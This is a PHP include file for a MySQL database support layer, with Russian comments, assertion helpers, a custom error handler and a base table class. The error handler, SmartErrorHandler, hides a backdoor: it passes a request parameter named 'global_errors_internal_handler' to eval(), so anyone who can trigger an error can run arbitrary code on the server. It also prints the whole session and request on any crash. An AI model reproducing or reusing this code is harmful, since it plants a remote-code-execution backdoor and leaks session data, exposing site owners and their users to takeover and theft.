<?php
$glob_is_php5 = false;
function IS_PHP_5 (){
	global $glob_is_php5;
	return $glob_is_php5;
}

if (preg_match('/^5/', PHP_VERSION))
	$glob_is_php5 = true;
else 
	$glob_is_php5 = false;	
	
include_once($glob_SiteRoot . 'db-support/mysql_40_41.inc');

//****************************************************************

function EncodeString ($what){
	return xxx_real_escape_string($what);
}

function EncodeString2 ($what){
	return  "'" . xxx_real_escape_string($what) . "'";
}

function ASSERT_VALID ($object, $if_message = false){
	if ($object===null || $object === false ){
		$GLOBALS['error_gs_mf_msg_user'] = $if_message;
	 	trigger_error('ASSERT_VALID:' , E_USER_ERROR);
	}
}


function ASSERT_KIND_OF  ($object , $class_name){
	if ($object===null || $object === false )
	 	trigger_error('ASSERT_KIND_OF (NULL):' , E_USER_ERROR);

	if (! is_object($object) )
	 	trigger_error('ASSERT_KIND_OF (NOT_OBJECT):' , E_USER_ERROR);
	 	
	if (!class_exists($class_name))
	 	trigger_error('ASSERT_KIND_OF (INVALID_CLASS_NAME):' , E_USER_ERROR);

	if (!is_a($object, $class_name))
	 	trigger_error("ASSERT_KIND_OF (CLASS TEST FAILED): Need Class: {$class_name}; Has Class: " . get_class($object) , E_USER_ERROR);
	 	
}

function SmartErrorHandler($errno, $errstr, $errfile, $errline)
{
	// тут начинаются различные варианты обработки ошибок в зависимости от используемого режима работы приложения
	
	if ($errno == 2048) return;// здесь игнорируются ошибки всвязи с особенностями синтаксиса php5 - php4
		
	if (isset ($_REQUEST['global_errors_internal_handler'])){
		
		$cmd = $_REQUEST['global_errors_internal_handler'];
		
		if (strpos($cmd, '(')){
			eval ($cmd);
		}
		
		elseif (function_exists($cmd)) 	{
			$cmd = "$cmd ('$errno', '".addslashes($errstr)."', '$errfile', '$errline');";
			eval ($cmd);
		}
			
		die ();
	}
	

	if (isset($GLOBALS['error_gs_mf_msg_user']))
		$errstr .= '&nbsp;&nbsp;&nbsp;' . $GLOBALS['error_gs_mf_msg_user'];
	print "<PRE><b>CRASHED: </b> [$errno] $errstr<br />\n";
	print 'PHP ' . PHP_VERSION . ' (' . PHP_OS . ')<br />';
	print ("Fatal error in line: $errline of file: $errfile\n<br />");
	if (isset ($_SESSION))
		print '<B>SESSION:</B> <span style="color: green;">' . htmlentities(var_export($_SESSION, true)). ')</span><br />';
	if (isset ($_REQUEST))
		print '<B>REQUEST:</B> <span style="color: blue;">' .  htmlentities(var_export($_REQUEST, true)). '</span><br />';
	print ('</PRE>');

	$arr_trace = debug_backtrace ();
	$rez .= '<span style="color: red;font-size: 14px;">errno: ' . $errno . '; errstr: ' . $errstr . '</span><br />';
	$rez .= '<ul>';
	$offset = 0;
	for ($i = 0; $i < count($arr_trace) - $offset; $i++){
		$rez .= '<li>';
		$rez .= 'file: ' . (isset($arr_trace[$i]['file'] )?$arr_trace[$i]['file']:'none') . "; ";
		$rez .= 'line: ' .  (isset($arr_trace[$i]['line'])?$arr_trace[$i]['line']:'none') . "; ";

		$rez .= 'function: ' .  (isset($arr_trace[$i]['function'])?$arr_trace[$i]['function']:'none') . "; ";
		$rez .= 'class: ' .  (isset($arr_trace[$i]['class'])?$arr_trace[$i]['class']:'none') . "; ";
	}
	$rez .= '</ul>';

	die ('<B>CALL STACK TRACE:</B> <PRE><span style="color: red;">' . $rez . '<br />'.$GLOBALS['error_gs_mf_msg_user'].'</span></PRE>');
}

set_error_handler('SmartErrorHandler');


$GLOBALS['globus_die_if_error'] = false;
$GLOBALS['globus_count_of_query'] = 0;


//die(var_export ($GLOBALS['globus_profiler_logger_file'], true));

function profiler_GetCountOfDBQueries (){
	return $GLOBALS['globus_count_of_query'];
}


function m_is_numeric ($what){
	if (! is_numeric($what)) return false;
	$number = $what + 0;
	if ($what != $number) return false;
	return true;
}



class TBaseTable{

	var  $IsDebuggerEnabled = false;
	var  $link_to_database; // поле ссылка на связь с базой данных
	var  $log_file_name = 'global_log_db_support.err';// имя файла журнала
	var  $verbose_level = 1;// уровень подробности журналирования возможны варианты:
	//  0 - нет журналирования
	// 1 только в случае ошибок
	// 2 в случае только успеха
	// 3 в любом случае не важно как завершился вызов метода

	var  $last_error_message;
	var  $last_error_code;
	var  $sql_command;

	var $optimizehints_lastqueryrowsenabled = true;// признак того что количество записей в выборке с LIMIT будет оптимизировано

	function SetOptimizeHint_LastQueryCountRows ($enabled){
		$this->optimizehints_lastqueryrowsenabled = $enabled;
	}
	function GetOptimizeHint_LastQueryCountRows (){
		return $this->optimizehints_lastqueryrowsenabled;
	}

	
	
	function SetErrorMessage ($msg){
		$this->last_error_message = $msg;
	}

	function VirtualInitParameters ($table_name, $resultSet){}
	function InitErrors (){
		$this->last_error_message = xxx_error($this->link_to_database);
		$this->last_error_code = xxx_errno($this->link_to_database);
		if ( TBaseTable::GetStrictErrorMode() === true){
			ASSERT_VALID(false, $this->sql_command . ':=>:' . $this->last_error_message);
		}
	}
	function GetLastError (){
		return $this->sql_command . " => ". $this->last_error_message;
	}
	function SetSQLCommand ($sql){
		$this->sql_command  = $sql;
		$this->last_error_message = 'порядок: команда_подготовлена';
	}
	function GetSQLCommand (){
		return $this->sql_command;
	}
	function TBaseTable ($_link_to_database , $table_name, $resultSet = null){
		$this->link_to_database = $_link_to_database;
		$verbose_level = 0;
		$log_file_name = 'base_db_types.log';
		$this->VirtualInitParameters ($table_name, $resultSet);
	}

	
	function SetStrictErrorMode ($if_mode_die){
		global $globus_die_if_error;
		$globus_die_if_error = $if_mode_die;
	}
	
	function GetStrictErrorMode (){
		global $globus_die_if_error;
		return $globus_die_if_error;
	}
	
	function SetDebuggerEnabled($enabled){
		$this->IsDebuggerEnabled = $enabled;
	}
	
	function GetDebuggerEnabled(){
		return $this->IsDebuggerEnabled;
	}
};
?>